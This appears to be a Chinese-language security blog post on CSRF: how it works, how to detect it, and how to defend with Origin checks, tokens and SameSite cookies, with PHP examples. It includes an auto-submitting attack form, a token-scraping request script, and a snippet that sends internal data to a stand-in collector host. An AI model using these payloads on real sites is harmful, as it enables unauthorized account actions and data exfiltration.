---
title: "CSRF 漏洞原理、检测方法与防御实践"
slug: csrf-attack-detection-and-defense
cover: ""
date: 2026-01-08
categories:
  - Web安全
  - top10
tags:
  - CSRF
  - 跨站请求伪造
  - Web漏洞
  - 漏洞检测
  - 安全防护
halo:
  site: http://www.hzhsec.top
  name: d12b052e-d495-4dc3-9553-b03641fe08e6
  publish: true
---

<!--more-->





<style>
img { text-align: center; display: block; margin: 0 auto; max-width: 100%; }
</style>

## 概览

**CSRF（跨站请求伪造）** 的检测、常见绕过手法与防御实践。

------

## 一、CSRF核心概念

- CSRF：攻击者在受害者已登录的情况下，诱导其浏览器向目标站点发送已认证的请求，从而实现未授权操作。常见影响包括修改账户信息、发起转账、改变密码、发帖等。
- 攻击前提通常要求受害者已登录目标站点并保持有效会话；防护要点为验证来源（Origin/Referer）、使用不可预测的 CSRF Token、及配置合适的 Cookie `SameSite` 策略。

------

<img src="/static/csrf.jpg">

# CSRF — 无检测时的检测与 PoC 生成

**检测方法**：

- 黑盒：使用浏览器/代理手工构造跨站请求（GET/POST/PUT/DELETE），观察是否需要 Token 或是否有来源校验；
- 白盒：阅读源码查找是否存在 `csrf` 字段、是否校验 `Origin/Referer`、是否使用 `SameSite`/CSRF 中间件等。

**生成 PoC**：

- Burp Suite -> Engagement tools -> Generate CSRF PoC，可快速生成 HTML/POST 用例；
- 手工 PoC 示例：自动提交 form 或 img 请求来触发目标操作。

```html
<form action="https://victim.example/action" method="POST">
  <input type="hidden" name="op" value="do_something" />
  <input type="submit" />
</form>
<script>document.forms[0].submit();</script>
```

**利用场景举例**：

- 修改账户设置（改邮箱/改密码）
- 发起不经用户确认的请求（例如发帖、转账请求的触发）

------

# CSRF — Referer/Origin 校验：实现与注意点

**优先使用 `Origin`**：对于跨站 `POST`/`PUT` 请求，现代浏览器会发送 `Origin`，它比 `Referer` 更安全且更短；若 `Origin` 不存在再退回 `Referer` 做模糊匹配。

**PHP 实现示例（推荐）**：

```php
<?php
function checkRequestOrigin(array $allowedHosts) {
    if (isset($_SERVER['HTTP_ORIGIN'])) {
        $originHost = parse_url($_SERVER['HTTP_ORIGIN'], PHP_URL_HOST);
        if (!in_array($originHost, $allowedHosts, true)) {
            http_response_code(403);
            exit('非法来源');
        }
        return;
    }

    if (isset($_SERVER['HTTP_REFERER'])) {
        $refHost = parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST);
        if (!in_array($refHost, $allowedHosts, true)) {
            http_response_code(403);
            exit('非法来源');
        }
        return;
    }

    http_response_code(403);
    exit('来源缺失');
}

// 用法：
$allowed = ['example.com', 'www.example.com'];
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    checkRequestOrigin($allowed);
}
?>
```

**注意点与绕过**：

- 攻击页面可以通过 `<meta name="referrer" content="no-referrer">` 阻止浏览器发送 `Referer`，因此不要单纯依赖 `Referer`；优先校验 `Origin`。
- 若服务处于不受信任的代理或 CDN 前，请确保上游不会篡改 `Origin/Referer`，并在边界清理危险头。

------

# CSRF — Token 校验：生成、校验与常见绕过

**生成与校验（Session 方案）**：

```php
<?php
session_start();
function generateCsrfToken() {
    if (empty($_SESSION['csrf_token'])) {
        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
    }
    return $_SESSION['csrf_token'];
}

function validateCsrfToken($token) {
    return isset($_SESSION['csrf_token']) && hash_equals($_SESSION['csrf_token'], $token);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $token = $_POST['csrf_token'] ?? '';
    if (!validateCsrfToken($token)) {
        http_response_code(403);
        exit('CSRF Token 验证失败');
    }
    // 处理业务逻辑
}
?>
```

**常见绕过方式**：

- **Token 被复用**：Token 生命周期过长或不与会话操作绑定时可能被复用；建议定期刷新 Token 或对关键操作使用单次性 Token。
- **Token 被删除或置空**：若后端对空值/缺失处理不严格，可能被绕过；务必对缺失或空串严格拒绝。
- **XSS 导致 Token 泄露**：若站点存在 XSS，Token 可能被窃取，CSRF Token 无法防止由 XSS 发起的请求。

------

## 二、实战脚本与检测示例

**AJAX 抓取页面 Token（检测用途）**：

```js
// 仅用于测试/检测
fetch('/profile').then(r => r.text()).then(text => {
  var m = text.match(/name="csrf_token" value="(.*?)"/);
  if (m) {
    var token = m[1];
    fetch('/action', {method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: 'csrf_token=' + token + '&op=1'});
  }
});
```

**示例：将站点内部数据发送到外部（调试/渗透测试用途）**：

```html
<script>
fetch('/debug').then(r => r.json()).then(j => {
    return fetch('https://your-collector.example.net', {method: 'POST', body: JSON.stringify({ data: j })});
});
</script>
```

------

## 三、常见伪造头与防护建议

攻击者/测试者常用的伪造头（若你在边界处不做过滤，它们可能被滥用）：

```
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Client-IP:127.0.0.1
X-Forwarded-Proto: https
X-Host: attacker.example
```

**防护建议**：

- 在反向代理/负载均衡器处统一清除或设置这些头，仅信任来自可信上游的头。
- 应用层不要直接信任这些头作为来源判断依据；来源校验应以 `Origin`/`Referer` + CSRF Token 为主。

------

## 四、CSRF 防护

1. **Origin 校验**（优先）+ **CSRF Token**（随机、不可预测、与会话绑定）。
2. 对重要操作使用**单次性短生命周期 Token**或二次确认（如短信/验证码）。
3. Cookie 使用 `SameSite=Lax` 或 `Strict`（根据业务权衡）来减少跨站发送 Cookie 风险。
4. 清理边界头，确保代理/负载均衡不被滥用。
5. 修复并防止 XSS —— CSRF 防护在存在 XSS 的站点会失效。
6. 日志与告警：记录 Token 校验失败、异常 `Origin`/`Referer` 访问。

------

## 五、总结

- CSRF 是经典但依然常见的漏洞，防护需要多层次（来源校验 + Token + Cookie 策略）。
- 不要把 `Referer` 当作唯一防线；优先使用 `Origin` 并结合 Session Token。
- 定期渗透测试并监测 Token 校验失败日志，以发现被绕过或异常利用的可能。